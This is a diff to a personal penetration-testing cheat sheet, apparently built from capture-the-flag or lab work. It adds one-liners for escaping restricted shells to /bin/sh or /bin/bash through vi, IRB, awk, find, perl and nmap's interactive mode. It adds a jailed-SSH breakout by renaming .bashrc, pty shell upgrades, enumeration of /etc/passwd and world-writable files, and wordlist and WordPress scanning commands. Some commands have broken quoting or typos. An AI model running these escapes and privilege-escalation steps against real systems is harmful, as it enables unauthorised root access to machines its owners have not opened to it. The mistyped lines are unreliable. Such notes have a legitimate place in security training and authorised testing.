@@ -1,4 +1,62 @@
-nmap -p- --script=vuln $IP > scan2
+sudo git -p --help
+!/bin/bash //Pagination root Privilege Escalation
+=============================================================================================================
+===From within vi
+:set shell=/bin/sh
+:shell
+
+===From within IRB
+exec "/bin/sh"
+
+===awk
+awk "BEGIN {system("/bin/bash")}"
+
+===find
+find / -exec /usr/bin/awk awk "BEGIN {system("/bin/bash")}" \;
+
+===perl
+perl -e 'exec "/bin/bash";'
+
+1. First for this method, find which bin file 'awk' is in
+find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
+=============================================================================================================
+================Jailed SSH Shell? Try this...================================================================
+Initial shell /bin/sh
+If BASH is blocked.
+Check if 'env' variable!
+Linux will default to /bin/bash default bashrc if there is no present .bashrc
+file in a User's home directory. Legit shell.......)
+
+1. ssh sara@127.0.0.1 "/bin/sh"
+2. cd $HOME
+3. mv .bashrc .bashrc.BAK (Yes this actually work)
+4. exit
+5. ssh sara@127.0.0.1
+
+$BLING BLING$
+sara@SkyTower
+=============================================================================================================
+[+ AND EXPORT PATH ]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='clear; ls -lsaht --color=aut0'
+Ctrl + Z [Background Process]
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
+=============================================================================================================
+======Once Broken out - Before PrivEsc Reference - Perform These COmmands====================================
+find / -perm -2 | -type 1 -ls 2>/dev/null | sort -r
+-------------------------------------------------------------------------------------------------------------
+grep -vE "nologin|false" /etc/passwd
+-------------------------------------------------------------------------------------------------------------
+===Other, misc
+nmap --interactive
+nmap> !sh
+=============================================================================================================
+===Vocabulary generation
+cewl $URL -m 5 $PWD/cewl.txt 2>/dev/null
 =============================================================================================================
 ===WPSCAN & SSL
 wpscan --url $URL --disable-tls-check --enumerate p --enumerate t --enumerate u
